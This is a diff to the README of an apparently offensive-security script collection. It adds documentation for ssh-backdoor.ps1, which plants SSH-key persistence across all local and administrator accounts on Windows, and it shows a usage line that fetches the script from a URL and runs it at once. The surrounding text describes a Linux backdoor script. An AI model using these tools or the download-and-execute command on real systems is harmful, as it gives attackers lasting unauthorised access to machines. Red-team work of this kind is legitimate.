@@ -92,6 +92,25 @@ python3 prefixsuffix.py [--all] [--leet] [--prefix <prefix1> <prefix2>] [--suffi
 quickpass.py <keywords> [--leet]
 ```
 
+## [ssh-backdoor.ps1](./ssh-backdoor.ps1) - Quick and Easy SSH Persistence (Windows)
+
+`ssh-backdoor.ps1` is a PowerShell script designed to simplify and automate the setup of SSH key-based persistance on Windows systems, especially for administrative users. This script manages SSH keys by configuring `authorized_keys` for individual users, setting up the required `administrators_authorized_keys` for admin accounts, and ensuring that proper permissions are enforced. 
+
+### Features
+- Creates `authorized_keys` in the `.ssh` directory for the current user, adding specified public keys for SSH access.
+- Admin-Specific Configuration:
+  - Creates and configures `administrators_authorized_keys` in `C:\ProgramData\ssh`, enforcing necessary permissions for the `Administrators` and `SYSTEM` groups.
+  - Automatically updates SSH settings to ensure `PubkeyAuthentication` is enabled.
+  - Adds keys to `authorized_keys` for all local user profiles on the system, providing SSH access across all accounts.
+- Creates timestamped backups of any files it modifies, ensuring existing configurations are preserved.
+- Restarts the SSH service if changes are made, but only if the script is run by an administrator.
+
+### Usage:
+To execute the script, run it in an elevated PowerShell prompt:
+```powershell
+Invoke-Expression (Invoke-WebRequest -Uri <script_url>).Content
+```
+
 ## [ssh-backdoor.sh](./ssh-backdoor.sh) - Quick and Easy SSH Persistence
 
 `ssh-backdoor.sh` is my absolute favourite script. It simplifies the process of setting up SSH persistence by adding public keys to the target's `~/.ssh/authorized_keys` file. This script ensures a secure and reliable backdoor for remote access if SSH login is available on the target machine. It performs the necessary directory and file setup, including backing up existing `authorized_keys`, setting appropriate permissions, and appending keys to the file.
